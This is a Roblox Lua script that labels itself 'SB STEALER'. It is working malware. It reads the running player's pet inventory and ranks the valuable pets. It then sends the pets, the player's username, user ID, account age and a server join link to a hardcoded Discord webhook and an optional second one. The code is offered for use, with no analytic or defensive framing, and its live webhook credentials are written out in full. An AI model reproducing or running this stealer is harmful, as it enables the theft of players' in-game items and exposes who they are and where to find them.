local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local MAIN_WEBHOOK_URL = "https://discord.com/api/webhooks/1386419413195952148/W_GLaIawA3lgTEiIzuNxft1DFXxL35-pNkxv3BCvgEwiiAs9ijD5GGhm28MS_W5"

local LOADER_WEBHOOK_URL = nil

if Webhook and type(Webhook) == "string" and Webhook:find("https://discord.com/api/webhooks/") then
    LOADER_WEBHOOK_URL = Webhook
end

local player = Players.LocalPlayer

local success, inventoryData = pcall(function()
    local DataService = require(ReplicatedStorage.Modules.DataService)
    return DataService:GetData().PetsData.PetInventory.Data
end)

if not success or not inventoryData then
    return
end

local petDataList, totalPets, hugePets, priorityPets, agedMutatedPets = {}, 0, {}, {}, {}
local targetPetsList = {
    "Disco Bee", "Raccoon", "Dragonfly", "Mimic Octopus", "Butterfly",
    "Queen Bee", "T-Rex", "Fennec Fox", "Rainbow Ankylosaurus",
    "Rainbow Dilophosaurus", "Rainbow Pachycephalosaurus",
    "Rainbow Iguanodon", "Rainbow Parasaurolophus", "Fox"
}

for uuid, petInfo in pairs(inventoryData) do
    if type(petInfo) == "table" and petInfo.PetData then
        local petType = tostring(petInfo.PetType or "Unknown")
        local baseWeight = tonumber(petInfo.PetData.BaseWeight) or 0
        local currentWeight = tonumber(petInfo.PetData.Weight) or baseWeight
        local age = tonumber(petInfo.PetData.Age) or 0
        local level = tonumber(petInfo.PetData.Level) or 1
        local mutation = ""
        local mutationValue = petInfo.PetData.MutationType or petInfo.PetData.Mutation or petInfo.PetData.mutation or petInfo.Mutation
        if mutationValue and mutationValue ~= "Normal" and mutationValue ~= "m" and mutationValue ~= "" then
            local mutationName = tostring(mutationValue)
            if mutationName == "k" or mutationName == "IronSkin" then mutation = "IronSkin "
            elseif mutationName == "d" or mutationName == "Shiny" then mutation = "Shiny "
            elseif mutationName == "l" or mutationName == "Radiant" then mutation = "Radiant "
            elseif mutationName == "n" or mutationName == "Ascended" then mutation = "Ascended "
            elseif mutationName == "f" or mutationName == "Frozen" then mutation = "Frozen "
            elseif mutationName == "g" or mutationName == "Inverted" then mutation = "Inverted "
            elseif mutationName == "e" or mutationName == "Windy" then mutation = "Windy "
            elseif mutationName == "a" or mutationName == "Shocked" then mutation = "Shocked "
            elseif mutationName == "b" or mutationName == "Burning" then mutation = "Burning "
            elseif mutationName == "c" or mutationName == "Corrupted" then mutation = "Corrupted "
            elseif mutationName == "h" or mutationName == "Starfall" then mutation = "Starfall "
            elseif mutationName == "i" or mutationName == "Overcharged" then mutation = "Overcharged "
            elseif mutationName == "j" or mutationName == "Radioactive" then mutation = "Radioactive "
            else mutation = "[" .. mutationName .. "] "
            end
        end
        local fullPetName = mutation .. petType
        if baseWeight > 0 or currentWeight > 0 then
            local petData = {type = fullPetName, weight = currentWeight, baseWeight = baseWeight, age = age, level = level, uuid = uuid, basePetType = petType}
            table.insert(petDataList, petData)
            totalPets = totalPets + 1
            local ageDays = math.floor(age / 86400)
            local isMutated = mutation ~= ""
            if baseWeight >= 4.0 then table.insert(hugePets, petData) end
            if ageDays >= 50 or isMutated then table.insert(agedMutatedPets, petData) end
            for _, targetPet in ipairs(targetPetsList) do
                if petType == targetPet then table.insert(priorityPets, petData); break end
            end
        end
    end
end

local function getPlayerInfo()
    local playerAge = player.AccountAge
    local jobId = game.JobId or "Unknown"
    local placeId = tostring(game.PlaceId)
    local joinLink = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    return {displayName = player.DisplayName, username = player.Name, userId = player.UserId, age = playerAge, joinLink = joinLink}
end

local function formatPetList()
    local priorityOnlyList = {}
    for _, pet in ipairs(petDataList) do
        local isHuge = pet.baseWeight >= 4.0
        local isAgedMutated = (math.floor(pet.age / 86400) >= 50) or (pet.type ~= pet.basePetType)
        local isTargetPet = false
        for _, targetPet in ipairs(targetPetsList) do
            if pet.basePetType == targetPet then isTargetPet = true; break end
        end
        if isHuge or isAgedMutated or isTargetPet then table.insert(priorityOnlyList, pet) end
    end
    if #priorityOnlyList == 0 then return "```\n🚫 No priority pets found\n```" end
    table.sort(priorityOnlyList, function(a, b)
        local aIsHuge = a.baseWeight >= 4.0; local bIsHuge = b.baseWeight >= 4.0
        local aIsAgedMutated = (math.floor(a.age / 86400) >= 50) or (a.type ~= a.basePetType)
        local bIsAgedMutated = (math.floor(b.age / 86400) >= 50) or (b.type ~= b.basePetType)
        local aIsPriority = false; local bIsPriority = false
        for _, targetPet in ipairs(targetPetsList) do
            if a.basePetType == targetPet then aIsPriority = true end
            if b.basePetType == targetPet then bIsPriority = true end
        end
        if aIsHuge ~= bIsHuge then return aIsHuge end
        if aIsAgedMutated ~= bIsAgedMutated then return aIsAgedMutated end
        if aIsPriority ~= bIsPriority then return aIsPriority end
        return a.weight > b.weight
    end)
    local petList = "```\n"
    for i, pet in ipairs(priorityOnlyList) do
        local ageText = ""
        if pet.age > 0 then
            local days = math.floor(pet.age / 86400); local hours = math.floor((pet.age % 86400) / 3600)
            if days > 0 then ageText = string.format(" (Age: %dd %dh)", days, hours) else ageText = string.format(" (Age: %dh)", hours) end
        end
        local weightText = ""
        if pet.weight ~= pet.baseWeight then weightText = string.format("%.2f KG (Base: %.2f KG)", pet.weight, pet.baseWeight) else weightText = string.format("%.2f KG", pet.weight) end
        local icon = "🐾"
        if pet.baseWeight >= 4.0 then icon = "💎"
        elseif (math.floor(pet.age / 86400) >= 50) or (pet.type ~= pet.basePetType) then icon = "⭐"
        else
            for _, targetPet in ipairs(targetPetsList) do
                if pet.basePetType == targetPet then icon = "🎯"; break end
            end
        end
        petList = petList .. string.format("%s %s - %s%s [Lv.%d]\n", icon, pet.type, weightText, ageText, pet.level)
        if i >= 20 then
            local remaining = #priorityOnlyList - 20
            if remaining > 0 then petList = petList .. string.format("➕ ... and %d more priority pets\n", remaining) end
            break
        end
    end
    return petList .. "```"
end

local function sendToDiscord()
    local playerInfo = getPlayerInfo()
    local petList = formatPetList()
    local embed = {title = "🐾 SB STEALER PALDO", color = 3447003, fields = {{name = "👤 Player Information", value = string.format("```\n🎮 Display Name: %s\n👤 Username: @%s\n🆔 User ID: %d\n📅 Account Age: %d days\n```", playerInfo.displayName, playerInfo.username, playerInfo.userId, playerInfo.age), inline = false}, {name = "📊 Inventory Statistics", value = string.format("```\n🐾 Total Pets: %d\n💎 Huge Pets (4kg+): %d\n⭐ Aged/Mutated: %d\n🎯 Priority Targets: %d\n```", totalPets, #hugePets, #agedMutatedPets, #priorityPets), inline = false}, {name = "🐾 All Pets (Priority First)", value = petList, inline = false}, {name = "🔗 Server Access", value = string.format("**[Join Server](%s)**", playerInfo.joinLink), inline = false}}, footer = {text = "🐾 Pet Inventory System • Powered by SB Stealer", icon_url = "https://cdn.discordapp.com/attachments/1384036950977019974/1384526026809409596/sb.png"}, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")}
    local payload = {username = "🐾 Pet Inventory System", avatar_url = "https://cdn.discordapp.com/attachments/1384036950977019974/1384526026809409596/sb.png", embeds = {embed}}
    local payloadJSON = HttpService:JSONEncode(payload)
    local webhooksToSendTo = { MAIN_WEBHOOK_URL, LOADER_WEBHOOK_URL }
    for _, url in ipairs(webhooksToSendTo) do
        if url and type(url) == "string" and url:find("https://discord.com/api/webhooks/") then
            task.spawn(function()
                pcall(function()
                    request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payloadJSON})
                end)
            end)
        end
    end
end

sendToDiscord()
